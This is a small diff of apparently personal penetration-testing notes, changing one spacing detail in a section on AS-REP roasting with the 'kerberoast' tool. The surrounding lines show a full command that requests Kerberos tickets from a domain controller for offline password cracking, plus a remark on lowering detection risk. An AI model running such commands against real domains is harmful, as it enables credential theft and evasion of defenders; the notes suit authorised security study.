@@ -59,7 +59,7 @@ public:: true
 				  ```
 			- With [Kerberoast]([[Kerberoast tool]])
 			  id:: 6567356f-171b-4626-a6ed-f9551a966b85
-				- This tool asks for aes128/256 encrypted tickets. Making the crack process way harder, but also decreasing the detection risk.
+				- This tool asks for aes 128/256 encrypted tickets. Making the crack process way harder, but also decreasing the detection risk.
 				- ```bash
 				  python3 -m kerberoast asreproast -r hpbank.local -u da 192.168.0.122 -e 18
 				  ```
